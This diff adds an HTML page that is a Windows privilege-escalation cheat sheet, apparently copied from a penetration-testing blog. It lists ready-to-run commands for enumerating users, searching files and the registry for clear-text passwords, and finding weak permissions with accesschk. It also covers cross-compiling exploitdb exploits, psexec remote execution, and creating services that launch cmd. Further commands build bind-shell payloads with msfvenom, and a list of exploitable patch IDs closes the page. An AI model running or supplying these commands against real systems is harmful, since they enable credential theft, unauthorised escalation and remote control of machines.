@@ -1,0 +1,76 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Windows Priv Esc</title>
+</head><body>http://www.exumbraops.com/penetration-testing-102-windows-privilege-escalation-cheatsheet/ <br/>
+<br/>
+OS and service pack<br/>
+systeminfo | findstr /B /C:”OS Name” /C:”OS Version”<br/>
+ver<br/>
+<br/>
+System name<br/>
+hostname<br/>
+<br/>
+Who are you?<br/>
+whoami<br/>
+echo %username%<br/>
+<br/>
+Finding other users<br/>
+net users<br/>
+net user username<br/>
+<br/>
+Clear-text passwords<br/>
+c:\unattend.txt<br/>
+c:\sysprep.ini - [Clear Text]<br/>
+c:\sysprep\sysprep.xml - [Base64]<br/>
+findstr /si password *.txt | *.xml | *.ini<br/>
+reg query HKLM /s | findstr /i password &gt; temp.txt<br/>
+reg query HKCU /s | findstr /i password &gt; temp.txt<br/>
+reg query HKLM /f password /t REG_SZ /s<br/>
+reg query HKCU /f password /t REG_SZ /s<br/>
+<br/>
+Finding weak directory permissions<br/>
+accesschk.exe /accepteula<br/>
+accesschk.exe -uwdqs users c:\<br/>
+accesschk.exe -uwdqs “Authenticated Users” c:\<br/>
+<br/>
+Finding weak file permissions<br/>
+accesschk.exe -uwqs users c:\*.*<br/>
+accesschk.exe -uwqs “Authenticated Users” c:\*.*<br/>
+cacls &quot;c:\Program Files&quot; /T | findstr Users<br/>
+<br/>
+Weak Service permissions<br/>
+accesschk.exe –uwcqv *<br/>
+<br/>
+Cross compile exploits<br/>
+cp /usr/share/exploitdb/platforms/windows/local/&lt;exploit&gt;.c /tmp/ <br/>
+cd /root/.wine/drive_c/MinGW/bin<br/>
+wine gcc –o w00t.exe /tmp/&lt;exploit&gt;.c -l lib<br/>
+<br/>
+PSexec<br/>
+psexec.py &lt;user&gt;@&lt;host&gt; &lt;cmd&gt;<br/>
+psexec.exe \\&lt;host&gt; &lt;cmd&gt;<br/>
+<br/>
+Services<br/>
+sc create &lt;servicename&gt; binpath= “c:\windows\system32\cmd.exe /k &lt;pathtobinaryexecutable&gt;” DisplayName= &lt;displayname&gt;<br/>
+sc start &lt;servicename&gt;<br/>
+<br/>
+Creating bind shells<br/>
+msfvenom -p windows/shell_bind_tcp -f exe -o &lt;Filename.exe&gt; LPORT=&lt;BindPort&gt;<br/>
+msfvenom -p windows/shell_bind_tcp -f dll -o &lt;Filename.dll&gt; LPORT=&lt;BindPort&gt;<br/>
+<br/>
+Privilege Escalation Exploits by Patch<br/>
+MS10-015 <br/>
+MS10-059<br/>
+MS10-092<br/>
+MS11-080<br/>
+MS13-005<br/>
+CVE-2013-3660<br/>
+MS13-053<br/>
+MS13-081<br/>
+MS14-058<br/>
+MS14-068<br/>
+MS14-070<br/>
+MS15-001<br/>
+MS15-051<br/>
+MS15-052</body></html>
